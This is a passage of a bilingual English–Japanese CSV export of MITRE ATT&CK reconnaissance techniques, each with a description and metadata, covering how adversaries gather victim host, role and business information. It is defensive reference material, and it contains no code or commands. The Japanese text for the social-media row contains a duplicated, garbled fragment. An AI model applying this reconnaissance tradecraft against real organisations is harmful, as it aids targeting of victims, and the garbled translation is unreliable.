T1591.002,T1591,Business Relationships,ビジネス関係,"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",攻撃者は、標的選定時に活用可能な被害者のビジネス関係に関する情報を収集する可能性がある。組織のビジネス関係に関する情報には、接続済み（かつ権限昇格の可能性のある）ネットワークアクセスを持つ二次・三次組織／ドメイン（例：マネージドサービスプロバイダー、請負業者など）を含む多様な詳細が含まれる。この情報は、被害者のハードウェア・ソフトウェアリソースのサプライチェーンや出荷経路を明らかにする可能性もある。 攻撃者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性がある。 ビジネス関係に関する情報は、オンラインやその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に晒される可能性もあります。(引用元: ThreatPost Broadvoice Leak) この情報の収集により、他の偵察手法（例: [情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会が明らかになり、運用リソースの確立が可能となる （例：[アカウントの確立](https://attack.mitre.org/techniques/T1585) や [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および／または初期アクセス （例：[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)、[ドライブバイ侵害](https://attack.mitre.org/techniques/T1189)、または[信頼関係](https://attack.mitre.org/techniques/T1199)）。,reconnaissance,PRE,other,unknown,privileged_account;user_interaction;network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--6ee2dc99-91ad-4534-a7d8-a649358c331f,2020-10-02T16:27:55.713Z,2025-04-15T21:54:59.306Z,,,,
T1591.003,T1591,Identify Business Tempo,ビジネステンポの特定,"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",敵対者は、標的選定時に利用可能な被害者のビジネステンポに関する情報を収集する可能性がある。 組織の業務リズムに関する情報には、稼働時間や稼働曜日など様々な詳細が含まれる。この情報は、被害者のハードウェア・ソフトウェアリソースの購入時期や出荷時期を明らかにする可能性もある。攻撃者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性がある。 業務リズムに関する情報は、オンラインやその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に晒される可能性もある。(引用元: ThreatPost Broadvoice Leak) この情報の収集により、他の偵察手法（例: [情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会が明らかになり、運用リソースの確立が可能となる （例：[アカウントの確立](https://attack.mitre.org/techniques/T1585) や [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および／または初期アクセス （例：[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195) または [信頼関係](https://attack.mitre.org/techniques/T1199)）,reconnaissance,PRE,other,unknown,user_interaction,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f,2020-10-02T16:34:32.435Z,2025-04-15T22:40:43.647Z,,,,
T1591.004,T1591,Identify Roles,役割の特定,"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",攻撃者は標的選定時に利用可能な、被害組織内の身元や役割に関する情報を収集する可能性がある。業務上の役割に関する情報は、主要な担当者の特定可能な情報や、彼らがアクセス可能なデータ/リソースなど、様々な標的可能な詳細を明らかにする可能性がある。攻撃者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性がある。また、オンラインやその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて、業務上の役割に関する情報が敵対者に晒される可能性もある。（引用元：ThreatPost Broadvoice Leak）この情報の収集により、他の偵察手法（例：[情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会が明らかになる可能性があり、運用リソース（例： [アカウントの確立](https://attack.mitre.org/techniques/T1585) や [アカウントの侵害](https://attack.mitre.org/techniques/T1586))、および/または初期アクセス（例：[フィッシング](https://attack.mitre.org/techniques/T1566)）の確立につながる可能性がある。,reconnaissance,PRE,other,unknown,user_interaction;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--cc723aff-ec88-40e3-a224-5af9fd983cc4,2020-10-02T16:37:30.015Z,2025-04-15T22:40:57.270Z,,,,
T1592,,Gather Victim Host Information,被害者ホスト情報の収集,"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.). Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary’s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.(Citation: TrellixQakbot)",攻撃者は標的選定時に利用可能な被害者ホストに関する情報を収集する可能性があります。ホスト情報には、管理データ（例：名称、割り当てIP、機能など）や構成に関する詳細（例：OS、言語など）を含む多様な情報が含まれます。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な収集行動など、様々な方法でこの情報を収集する可能性があります。また、サイトを侵害した後、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを含めることもあります。（引用元：ATT ScanBox）ホスト情報は、オンラインやその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に晒される可能性もあります。 この情報の収集により、他の形態の偵察（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）や運用リソースの確立の機会が明らかになる可能性があります。 （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195) または [外部リモートサービス](https://attack.mitre.org/techniques/T1133)）。 攻撃者は、ユーザーエージェントHTTPヘッダーを介して被害者ホスト情報を収集することもある。これは要求元ユーザーエージェントのアプリケーション、OS、ベンダー、バージョンを特定するためにサーバーに送信される。これは攻撃者の追撃行動の指針となる。例えば攻撃者はユーザーエージェントから要求元OSを確認し、対象OS向けのマルウェアのみを配信し他を無視する。(引用元: TrellixQakbot),reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f,2020-10-02T16:39:33.966Z,2025-04-15T22:37:32.347Z,,,,
T1592.001,T1592,Hardware,ハードウェア,"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.). Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",攻撃者は標的選定時に活用可能な被害者ホストのハードウェア情報を収集する可能性がある。ハードウェアインフラに関する情報には、特定ホストの機種・バージョン情報に加え、追加防御機能の存在を示すコンポーネント（例：カード/生体認証リーダー、専用暗号化ハードウェア等）の有無が含まれる。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)による直接収集（例：ホスト名、サーバーバナー、ユーザーエージェント文字列）や[情報フィッシング](https://attack.mitre.org/techniques/T1598)など、様々な方法でこの情報を収集する可能性がある。 また、攻撃者はサイトを侵害した後、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを埋め込むこともあります（引用元：ATT ScanBox）。ハードウェアインフラに関する情報は、オンラインやその他のアクセス可能なデータセット（例：求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書）を通じて攻撃者に公開される可能性もあります。 この情報の収集により、他の偵察手法（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）や運用リソースの確立に向けた機会が明らかになる可能性があります （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[ハードウェア供給網の侵害](https://attack.mitre.org/techniques/T1195/003) または [ハードウェア追加](https://attack.mitre.org/techniques/T1200)）。,reconnaissance,PRE,data_collection,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26,2020-10-02T16:40:47.488Z,2025-04-15T22:39:29.396Z,,,,
T1592.002,T1592,Software,ソフトウェア,"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.). Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",攻撃者は、標的選定時に利用可能な被害者ホストのソフトウェア情報を収集する可能性がある。インストール済みソフトウェアに関する情報には、特定ホスト上の種類やバージョンといった詳細に加え、追加防御対策（例：アンチウイルス、SIEMなど）の存在を示す可能性のある追加コンポーネントの有無などが含まれる。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)（例：リスニングポート、サーバーバナー、ユーザーエージェント文字列）や[情報フィッシング](https://attack.mitre.org/techniques/T1598) による直接収集など、様々な方法でこの情報を収集する可能性があります。 また、攻撃者はサイトを侵害し、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを含める場合もあります（引用元：ATT ScanBox）。インストールされているソフトウェアに関する情報は、オンラインまたはその他のアクセス可能なデータセット（例：求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書）を通じて攻撃者に公開される可能性もあります。 この情報の収集により、他の偵察手法（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）や運用リソースの確立に向けた機会が明らかになる可能性があります （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス手段の確保につながる可能性があります （例：[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195) または [外部リモートサービス](https://attack.mitre.org/techniques/T1133)）。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--baf60e1a-afe5-4d31-830f-1b1ba2351884,2020-10-02T16:42:17.482Z,2025-04-15T23:09:53.612Z,,,,
T1592.003,T1592,Firmware,ファームウェア,"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.). Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",攻撃者は、標的選定時に利用可能な被害者ホストのファームウェア情報を収集する可能性がある。ホストファームウェアに関する情報には、特定のホストにおける種類やバージョンなど様々な詳細が含まれ、環境内のホストに関する追加情報（例：構成、目的、稼働期間/パッチ適用レベルなど）を推測するために使用される可能性がある。 攻撃者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性があります。ホストファームウェアに関する情報は、オンラインまたはその他のアクセス可能なデータセット（例：求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書）を通じてのみ攻撃者に公開される場合があります。(引用元: ArsTechnica Intel) この情報の収集は、他の偵察手法（例: [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）の機会を明らかにし、運用リソースの確立につながる可能性があります （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195) または [公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190)）。,reconnaissance,PRE,config_policy_manipulation,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--b85f6ce5-81e8-4f36-aff2-3df9d02a9c9d,2020-10-02T16:46:42.537Z,2025-04-15T22:36:31.208Z,,,,
T1592.004,T1592,Client Configurations,クライアント構成,"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",攻撃者は、標的選定時に利用可能な被害者のクライアント構成に関する情報を収集する可能性がある。クライアント構成に関する情報には、オペレーティングシステム/バージョン、仮想化、アーキテクチャ（例：32ビットまたは64ビット）、言語、および/またはタイムゾーンなど、様々な詳細や設定が含まれる。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)（例：リスニングポート、サーバーバナー、ユーザーエージェント文字列）や[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接収集など、様々な方法でこの情報を収集する可能性があります。 また、攻撃者はサイトを侵害し、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを含める場合もあります（引用元：ATT ScanBox）。クライアント構成に関する情報は、オンラインまたはその他のアクセス可能なデータセット（例：求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書）を通じて攻撃者に公開される場合もあります。 この情報の収集により、他の偵察手法（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）や運用リソースの確立に向けた機会が明らかになる可能性があります （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195) または [外部リモートサービス](https://attack.mitre.org/techniques/T1133)）。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--774ad5bb-2366-4c13-a8a9-65e50b292e7c,2020-10-02T16:47:16.719Z,2025-04-15T21:57:34.604Z,,,,
T1593,,Search Open Websites/Domains,公開ウェブサイト/ドメインの検索,"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking) Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).",敵対者は、標的選定時に利用可能な被害者情報を、自由にアクセス可能なウェブサイトやドメインから収集する可能性がある。 被害者に関する情報は、ソーシャルメディア、ニュースサイト、採用情報や受注・契約情報など事業運営に関する情報を掲載するサイトなど、様々なオンラインサイトで入手できる可能性がある。(引用元: Cyware Social Media)(引用元: SecurityTrails Google Hacking)(引用元: ExploitDB GoogleHacking)敵対者は、収集しようとする情報に応じて、さまざまなオンラインサイトで検索を行う可能性がある。 これらの情報源から得られた情報は、他の偵察手法（例：[情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）の機会を明らかにし、運用リソースの確立につながる可能性があります。 （例：[アカウントの確立](https://attack.mitre.org/techniques/T1585) または [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [フィッシング](https://attack.mitre.org/techniques/T1566)）。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--a0e6614a-7740-4b24-bd65-f1bde09fc365,2020-10-02T16:48:04.509Z,2025-04-15T23:04:23.505Z,,,,
T1593.001,T1593,Social Media,ソーシャルメディア,"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff. Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",攻撃者は標的選定時に利用可能な被害者情報をソーシャルメディアで検索する可能性がある。ソーシャルメディアサイトには、被害組織に関する様々な情報（事業発表、スタッフの役割・所在地・関心事項など）が含まれる場合がある。 攻撃者は収集したい情報に応じて異なるソーシャルメディアサイトを検索する可能性がある。脅威アクターはこれらのサイトから受動的にデータを収集するだけでなく、収集した情報を利用して偽のプロフィール/グループを作成し、被害者に特定の情報を開示させる（例：[スピアフィッシングサービス](https://attack.mitre.org/techniques/T1598/001)）。(引用元: Cyware Social Media）これらの情報源から得られた情報は、他の形態の偵察（例：[情報フィッシング](https://attack.mitre.org/techniques/T1598)や[公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）や運用リソースの確立（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)や[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および／または初期アクセス手段の確保につながる可能性があります。(https://attack.mitre.org/techniques/T1585) や [アカウント侵害](https://attack.mitre.org/techniques/T1586))、および／または初期アクセス（例：[サービス経由のスピアフィッシング](https://attack.mitre.org/techniques/T1566/003)）の機会を明らかにする可能性がある。,reconnaissance,PRE,other,unknown,user_interaction;cloud_control_plane;file_storage_access;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--bbe5b322-e2af-4a5e-9625-a4e62bf84ed3,2020-10-02T16:49:31.262Z,2025-04-15T23:08:29.336Z,,,,
T1593.002,T1593,Search Engines,検索エンジン,"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking) Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).",攻撃者は、標的選定時に活用可能な被害者情報を収集するため検索エンジンを利用する場合がある。検索エンジンサービスは通常、オンラインサイトをクロールしてコンテンツをインデックス化し、特定のキーワードやコンテンツタイプ（例：ファイルタイプ）を検索するための特殊構文をユーザーに提供する。(引用: SecurityTrails Google Hacking)(引用: ExploitDB GoogleHacking) 攻撃者は収集対象情報に応じて様々な検索クエリを作成する可能性がある。 脅威アクターは、被害者に関する一般的な情報を収集するために検索エンジンを利用したり、ネットワークの詳細や認証情報などの機密情報の流出・漏洩を探すために特殊なクエリを使用したりすることがあります。 これらの情報源から得られた情報は、他の形態の偵察（例：[情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）の機会を明らかにし、運用リソースを確立する可能性があります。 （例：[アカウントの確立](https://attack.mitre.org/techniques/T1585) や [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および／または初期アクセス （例：[有効なアカウント](https://attack.mitre.org/techniques/T1078) または [フィッシング](https://attack.mitre.org/techniques/T1566)）。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;user_interaction;network_connectivity;file_storage_access;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--6e561441-8431-4773-a9b8-ccf28ef6a968,2020-10-02T16:50:12.809Z,2025-04-15T23:03:45.401Z,,,,
T1593.003,T1593,Code Repositories,コードリポジトリ,"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git. Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). **Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code 